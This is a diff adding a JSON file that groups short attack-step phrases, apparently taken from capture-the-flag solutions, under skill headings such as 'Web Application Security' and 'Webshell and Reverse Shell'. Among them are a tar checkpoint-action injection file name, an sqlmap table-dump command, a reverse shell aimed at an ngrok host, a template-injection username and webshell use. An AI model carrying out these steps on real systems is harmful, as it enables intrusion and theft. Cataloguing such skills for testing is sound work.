@@ -1,0 +1,76 @@
+{
+    "Python Scripting": [
+        "Use a python script to send requests.",
+        "Write a Python script to automate the process.",
+        "Write a script to automate this process of generating payloads and making POST requests.",
+        "Create a Python script."
+    ],
+    "HTTP Requests and Libraries": [
+        "Use the 'requests' library to send HTTP GET requests."
+    ],
+    "Loops and Iterations": [
+        "Create a for loop to iterate through the numbers from 1 to 20."
+    ],
+    "Encoding and Decoding": [
+        "Use btoa javascript function.",
+        "Encoded the contents of the retrieved file in base64 format for smooth transfer without encoding issues"
+    ],
+    "Web Application Security": [
+        "Use Burp Suite.",
+        "Use the command 'sqlmap -r invoice.req --tamper tamper.py --threads 10 -T news_article --dump'.",
+        "Utilize the web shell to gain access to the file system."
+    ],
+    "File Manipulation": [
+        "Create the file '--checkpoint-action=exec=sh shell.txt'.",
+        "Generate a file with random content.",
+        "Verify the current size of the tar archive.",
+        "Use Python scripting to manipulate the PDF files.",
+        "Use the 'mutool' command to manipulate the PDF files.",
+        "Create 'merged.pdf' containing a dummy PDF.",
+        "Include the chosen input PDFs in the 'merged.pdf'.",
+        "Create 'collision1.pdf' with the predetermined prefix.",
+        "Create 'collision2.pdf' with the predetermined prefix.",
+        "Use the 'mutool info -X' command to verify 'collision1.pdf'.",
+        "Use the 'mutool info -X' command to verify 'collision2.pdf'.",
+        "Write a script to bruteforce each of the hardcoded cookie names.",
+        "Create a zip file.",
+        "Add a `run` bash script to the zip file.",
+        "Upload the zip file.",
+        "Download the `openapi.json` file."
+    ],
+    "Command Line and System Manipulation": [
+        "Set permissions of the 'id' file to 777",
+        "Exported '/tmp' to the PATH",
+        "Use inline commands of Redis to send commands directly.",
+        "Set up a local HTTP proxy using cURL to accommodate the complex GET request.",
+        "Use the command 'python nodejsshell.py 2.tcp.ngrok.io 13755' to generate a reverse shell payload for the ngrok tunnel.",
+        "Copy the output from the crafted reverse shell payload.",
+        "Write the port number used to a file to keep track."
+    ],
+    "Web Development and Deployment": [
+        "Build a HTML page to automate this process.",
+        "Deploy the previously developed JavaScript payload.",
+        "Deploy this page on a server.",
+        "Point the 'screenshotter' service to the deployed page.",
+        "Create the server script."
+    ],
+    "Data Manipulation": [
+        "Use the 'tryNumber' function."
+    ],
+    "SMS Messaging": [
+        "Compose an SMS message"
+    ],
+    "Authentication and Authorization": [
+        "Set one of the usernames as '{{ add_money_to_login(USERNAME, AMOUNT_OF_MONEY) }}'",
+        "Use hashlib, URLSafeTimedSerializer and TimestampSigner in Python."
+    ],
+    "Webshell and Reverse Shell": [
+        "Navigate to the uploaded webshell."
+    ],
+    "Network Requests": [
+        "Setup a request"
+    ],
+    "Remote Server Setup": [
+        "Set up a remote server for this purpose."
+    ]
+}
